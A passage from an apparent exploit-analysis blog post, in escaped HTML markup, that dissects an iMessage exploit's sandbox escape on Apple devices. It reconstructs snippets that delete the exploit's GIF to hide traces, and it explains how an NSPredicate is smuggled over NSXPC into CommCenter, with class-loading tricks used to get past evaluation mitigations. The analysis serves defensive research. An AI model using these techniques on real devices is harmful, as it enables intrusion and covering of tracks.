class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSArray* allTmpFiles = [dir_enum allObjects];&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSString* filter;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;filter = [&amp;quot;@&amp;quot;SELF ENDSWITH &amp;#39;&amp;quot; stringByAppendingString: &amp;quot;XXX.gif&amp;quot;];&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;filter = [filter stringByAppendingString: &amp;quot;&amp;#39;&amp;quot;];&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSPredicate* pred;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;pred = [NSPredicate predicateWithFormat: filter]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSArray* matches;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;matches = [allTmpFiles filteredArrayUsingPredicate: pred];&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSString* gif_subpath = [matches firstObject];&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSString* root = @&amp;quot;/tmp/com.apple.messages&amp;quot;;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSString* full_path;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;full_path = [root stringByAppendingPathComponent: gifSubpath];&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[fm _web_removeFileOnlyAtPath: full_path];&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;This finds the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;XXX.gif&lt;/span&gt;&lt;span&gt;&amp;nbsp;file used to deliver the exploit which iMessage has stored somewhere under the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;/tmp/com.apple.messages&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;folder and deletes it&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;The other two &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpressions&lt;/span&gt;&lt;span&gt;&amp;nbsp;build a payload and then trigger its evaluation in &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CommCenter&lt;/span&gt;&lt;span&gt;. For that we need to look at &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSXPC&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.3sby3b68al28"&gt;&lt;span class="YDzVciBUld-c3 YDzVciBUld-c9"&gt;NSXPC&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;NSXPC is a semi-transparent remote-procedure-call mechanism for Objective-C. It allows the instantiation of proxy objects in one process which transparently forward method calls to the &amp;quot;real&amp;quot; object in another process:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiju_-thk9djtuTJr7kWQuOIF8O3xydoja-FIW5gcwq9s1TGTtvobsRcyQ9_TFbXhta_6I9VQj0u8hyJfLixzGgmOFT4jy3UAcV31MT24-p_vwCGpotG5jQdna1PxNHW3EaSN4d1cQ_vpXAKKWy1V5us-ZlEvUkN5dAq-KjgQFLcQ97jglBLYky_lqs2w/s1437/image1.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiju_-thk9djtuTJr7kWQuOIF8O3xydoja-FIW5gcwq9s1TGTtvobsRcyQ9_TFbXhta_6I9VQj0u8hyJfLixzGgmOFT4jy3UAcV31MT24-p_vwCGpotG5jQdna1PxNHW3EaSN4d1cQ_vpXAKKWy1V5us-ZlEvUkN5dAq-KjgQFLcQ97jglBLYky_lqs2w/s600/image1.png" border="0" alt="" style="max-height: 750; max-width: 600;"title="" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c16"&gt;&lt;span class="YDzVciBUld-c13 YDzVciBUld-c3"&gt;https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;I say NSXPC is only semi-transparent because it does enforce some restrictions on what objects are allowed to traverse process boundaries. Any object &amp;quot;exported&amp;quot; via &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSXPC&lt;/span&gt;&lt;span&gt;&amp;nbsp;must also define a &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;protocol&lt;/span&gt;&lt;span&gt;&amp;nbsp;which designates which methods can be invoked and the allowable types for each argument. The &lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html#//apple_ref/doc/uid/10000172i-SW6-SW7"&gt;NSXPC programming guide&lt;/a&gt;&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;further explains the extra handling required for methods which require collections and other edge cases.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;The low-level serialization used by NSXPC is the same explored by Natalie Silvanovich in her 2019 blog post looking at &lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://googleprojectzero.blogspot.com/2019/08/the-fully-remote-attack-surface-of.html"&gt;the fully-remote attack surface of the iPhone&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. An important observation in that post was that &lt;/span&gt;&lt;span class="YDzVciBUld-c14"&gt;subclasses of classes with any level of inheritance are also allowed, as is always the case with NSKeyedUnarchiver deserialization.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;This means that any &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;protocol&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;object which declares a particular type for a field will also, by design, accept any subclass of that type.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;The logical extreme of this would be that a protocol which declared an argument type of NSObject would allow any subclass, which is the vast majority of all Objective-C classes.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.v64ixuc668lc"&gt;&lt;span class="YDzVciBUld-c9 YDzVciBUld-c3"&gt;Grep to the rescue&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;This is fairly easy to analyze automatically. Protocols are defined statically so we can just find them and check each one. Tools like &lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://github.com/nst/RuntimeBrowser/"&gt;RuntimeBrowser&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="http://stevenygard.com/projects/class-dump/"&gt;classdump&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;can parse the static protocol definitions and output human-readable source code. Grepping the output of RuntimeBrowser like this is sufficient to find dozens of cases of &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;pointers in Objective-C protocols:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; $ egrep -Rn &amp;quot;\(NSObject \*\)arg&amp;quot; *&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Not all the results are necessarily exposed via &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSXPC&lt;/span&gt;&lt;span&gt;, but some clearly are, including the following two matches in &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CoreTelephony.framework&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;Frameworks/CoreTelephony.framework/\&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;CTXPCServiceSubscriberInterface-Protocol.h:39:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;-(void)evaluateMobileSubscriberIdentity:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; (CTXPCServiceSubscriptionContext *)arg1&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;identity:(NSObject *)arg2&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;completion:(void (^)(NSError *))arg3;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;Frameworks/CoreTelephony.framework/\&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;CTXPCServiceCarrierBundleInterface-Protocol.h:13:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;-(void)setWiFiCallingSettingPreferences:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;(CTXPCServiceSubscriptionContext *)arg1&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key:(NSString *)arg2&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;value:(NSObject *)arg3&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;completion:(void (^)(NSError *))arg4;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;evaluateMobileSubscriberIdentity&lt;/span&gt;&lt;span&gt;&amp;nbsp;string appears in the list of selector-like strings we first saw when running strings on the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;bplist00&lt;/span&gt;&lt;span&gt;. Indeed, looking at the parsed and beautified &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSFunctionExpression&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;we see it doing this:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[ [ [CoreTelephonyClient alloc] init]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; context:X&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; evaluateMobileSubscriberIdentity:Y]&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;This is a wrapper around the lower-level &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSXPC&lt;/span&gt;&lt;span&gt;&amp;nbsp;code and the argument passed as &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;Y&lt;/span&gt;&lt;span&gt;&amp;nbsp;above to the CoreTelephonyClient method corresponds to the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;identity:(NSObject *)arg2&lt;/span&gt;&lt;span&gt;&amp;nbsp;argument passed via &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSXPC&lt;/span&gt;&lt;span&gt;&amp;nbsp;to &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;(which is the process that hosts &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;com.apple.commcenter.xpc&lt;/span&gt;&lt;span&gt;, the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSXPC&lt;/span&gt;&lt;span&gt;&amp;nbsp;service underlying the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CoreTelephonyClient&lt;/span&gt;&lt;span&gt;). Since the parameter is explicitly named as &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSObject*&lt;/span&gt;&lt;span&gt;&amp;nbsp;we can in fact pass any subclass of &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSObject*&lt;/span&gt;&lt;span&gt;, including an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicate&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;! Game over?&lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.7ums8k4ivkbp"&gt;&lt;span class="YDzVciBUld-c9 YDzVciBUld-c3"&gt;Parsing vs Evaluation&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;It&amp;#39;s not quite that easy. The &lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://blog.chichou.me/2021/01/16/see-no-eval-runtime-code-execution-objc/"&gt;DezhouInstrumentz writeup&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;discusses this attack surface and notes that there&amp;#39;s an extra, specific mitigation. When an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicate&lt;/span&gt;&lt;span&gt;&amp;nbsp;is deserialized by its &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;initWithCoder:&lt;/span&gt;&lt;span&gt;&amp;nbsp;implementation it sets a flag which disables evaluation of the predicate until the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;allowEvaluation&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;method is called.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;So whilst you certainly can pass an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSPredicate*&lt;/span&gt;&lt;span&gt;&amp;nbsp;as the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;identity&lt;/span&gt;&lt;span&gt;&amp;nbsp;argument across NSXPC and get it deserialized in &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CommCenter,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;the implementation of &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;evaluateMobileSubscriberIdentity:&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;is definitely not going to call &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;allowEvaluation:&lt;/span&gt;&lt;span&gt;&amp;nbsp; to make the predicate safe for evaluation then &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;evaluateWithObject:&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;and then evaluate it.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.34h1kqwr3d8t"&gt;&lt;span class="YDzVciBUld-c9 YDzVciBUld-c3"&gt;Old techniques, new tricks&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;From the exploit we can see that they in fact pass an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;NSArray&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;with two elements:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[0] = AVSpeechSynthesisVoice&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;[1] = PTSection {rows = NSArray { [0] = PTRow() }&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;The first element is an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;AVSpeechSynthesisVoice&lt;/span&gt;&lt;span&gt;&amp;nbsp;object and the second is a &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTSection&lt;/span&gt;&lt;span&gt;&amp;nbsp;containing a single &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTRow&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;. Why?&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;PTSection&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PTRow&lt;/span&gt;&lt;span&gt;&amp;nbsp;are both defined in the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PrototypeTools&lt;/span&gt;&lt;span&gt;&amp;nbsp;private framework. &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;PrototypeTools&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t loaded in the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CommCenter&lt;/span&gt;&lt;span&gt;&amp;nbsp;target process. Let&amp;#39;s look at what happens when an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;AVSpeechSynthesisVoice&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;is deserialized:&lt;/span&gt;&lt;/p&gt;&lt;h2 class="YDzVciBUld-c7" id="h.ihjz2r1jcklz"&gt;&lt;span&gt;Finding a voice&lt;/span&gt;&lt;/h2&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;AVSpeechSynthesisVoice&lt;/span&gt;&lt;span&gt;&amp;nbsp;is implemented in &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;AVFAudio.framework&lt;/span&gt;&lt;span&gt;, which &lt;/span&gt;&lt;span class="YDzVciBUld-c14"&gt;is&lt;/span&gt;&lt;span&gt;&amp;nbsp;loaded in &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;CommCenter&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;$ sudo vmmap `pgrep CommCenter` | grep AVFAudio&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;__TEXT &amp;nbsp;7ffa22c4c000-7ffa22d44000 r-x/r-x SM=COW \&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;/System/Library/Frameworks/AVFAudio.framework/Versions/A/AVFAudio&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span&gt;Assuming that this was the first time that an &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;AVSpeechSynthesisVoice&lt;/span&gt;&lt;span&gt;&amp;nbsp;object was created inside CommCenter (which is quite likely) the Objective-C runtime will call the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;initialize&lt;/span&gt;&lt;span&gt;&amp;nbsp;method on the &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;AVSpeechSynthesisVoice&lt;/span&gt;&lt;span&gt;&amp;nbsp;class &lt;/span&gt;&lt;span class="YDzVciBUld-c6"&gt;&lt;a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/objectivec/nsobject/1418639-initialize?language=objc"&gt;before instantiating the first instance&lt;/a&gt;&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c0"&gt;[AVSpeechSynthesisVoice initialize]&lt;/span&gt;&lt;span&gt;&amp;nbsp;has a &lt;/span&gt;&lt;span class="YDzVciBUld-c0"&gt;dispatch_once&lt;/span&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&amp;nbsp;block with the following code:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;NSBundle* bundle;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;bundle = [NSBundle bundleWithPath:&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;@&amp;quot;/System/Library/AccessibilityBundles/\&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;AXSpeechImplementation.bundle&amp;quot;];&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c1"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="YDzVciBUld-c4"&gt;&lt;span class="YDzVciBUld-c2 YDzVciBUld-c0"&gt;if (![bundle isLoaded]) 